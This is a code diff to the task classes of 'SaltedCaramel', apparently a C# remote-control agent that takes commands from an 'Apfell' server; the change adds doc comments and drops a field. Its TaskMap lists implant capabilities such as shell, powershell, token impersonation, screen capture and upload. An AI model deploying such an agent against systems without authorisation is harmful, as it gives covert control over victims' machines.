@@ -17,6 +17,11 @@ namespace SaltedCaramel
             public string response;
             public string id;
 
+            /// <summary>
+            /// Constructor for a SCTaskResp.
+            /// </summary>
+            /// <param name="id">Identifier for the task it's responding to.</param>
+            /// <param name="response">Plaintext of the data to send.</param>
             public SCTaskResp(string id, string response)
             {
                 this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
@@ -29,10 +34,20 @@ namespace SaltedCaramel
         /// </summary>
         public class SCTask
         {
+            /// <summary>
+            /// The command passed by Apfell, such as "mv".
+            /// </summary>
             public string command { get; set; }
+            /// <summary>
+            /// The parameters passed with the task given by
+            /// Apfell. e.g., given "mv" command, @params
+            /// could be "file1 file2"
+            /// </summary>
             public string @params { get; set; }
+            /// <summary>
+            /// ID of the task.
+            /// </summary>
             public string id { get; set; }
-            internal int shortId { get; set; }
 #if (DEBUG)
             public string status { get; set; }
             public string message { get; set; }
@@ -41,6 +56,10 @@ namespace SaltedCaramel
         internal string message { get; set; }
 #endif
 
+            /// <summary>
+            /// TaskMap is responsible for tracking what modules
+            /// are loaded into the agent at any one time.
+            /// </summary>
             public static Dictionary<string, string> TaskMap = new Dictionary<string, string>()
             {
                 { "cd", "ChangeDir" },
@@ -54,7 +73,7 @@ namespace SaltedCaramel
                 { "make_token", "Token" },
                 { "ps", "ProcessList" },
                 { "powershell", "Powershell" },
-                { "rev2self", "Token" }, // Needs to be split out into its own method + execute
+                { "rev2self", "Token" },
                 { "run", "Proc" },
                 { "screencapture", "ScreenCapture" },
                 { "shell", "Proc" },
@@ -65,6 +84,14 @@ namespace SaltedCaramel
                 { "upload", "Upload" }
             };
 
+            /// <summary>
+            /// Instantiate an SCTask instance based
+            /// on information provided by the Apfell
+            /// server.
+            /// </summary>
+            /// <param name="command">Command to execute, such as "mv"</param>
+            /// <param name="params">Parameters to go with the command.</param>
+            /// <param name="id">ID of the task, provided by Apfell</param>
             public SCTask(string command, string @params, string id)
             {
                 this.command = command;
